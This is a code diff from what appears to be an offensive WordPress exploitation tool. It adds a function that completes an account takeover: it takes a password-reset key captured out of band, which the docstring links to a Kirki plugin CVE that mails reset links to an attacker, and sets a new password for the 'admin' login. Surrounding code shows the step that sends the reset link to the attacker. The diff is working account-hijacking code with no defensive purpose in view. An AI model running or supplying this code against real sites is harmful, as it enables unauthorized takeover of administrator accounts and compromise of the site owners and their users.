@@ -194,3 +194,28 @@ def _account_takeover_oob(base, http, recipe):
                           f"({attacker}) for user '{target}' → reset link sent "
                           f"to attacker. Complete the takeover from that mailbox."}
     return None
+
+
+def complete_reset_key(base, http, reset_key, login="admin", new_password=None):
+    """Finish a WordPress password reset from a key captured out-of-band — e.g. the
+    reset link an OOB-takeover CVE (kirki CVE-2026-8206) mails to the attacker's
+    inbox. This is the one manual step account-takeover-oob can't automate: the
+    operator reads the key, then this closes it out. Mirrors wp-login.php's two-step
+    flow on the shared session — action=rp primes the wp-resetpass-<COOKIEHASH>
+    cookie (login:key), then action=resetpass POSTs the new password WITH rp_key,
+    which WP hash_equals's against the cookie's key (omitting rp_key is a PHP-8
+    TypeError → 500, not a silent no-op). Returns {'username','password'} when the
+    page confirms the reset, else None; the caller then logs in to prove it took."""
+    base = base.rstrip("/")
+    newpw = new_password or _random_creds()["password"]
+    login_url = base + "/wp-login.php"
+    try:
+        http.get(login_url, params={"action": "rp", "key": reset_key, "login": login})
+        r = http.post(login_url, params={"action": "resetpass"},
+                      data={"rp_key": reset_key, "pass1": newpw, "pass2": newpw,
+                            "wp-submit": "Reset Password"})
+    except Exception:
+        return None
+    if "has been reset" in (getattr(r, "text", "") or ""):
+        return {"username": login, "password": newpw}
+    return None
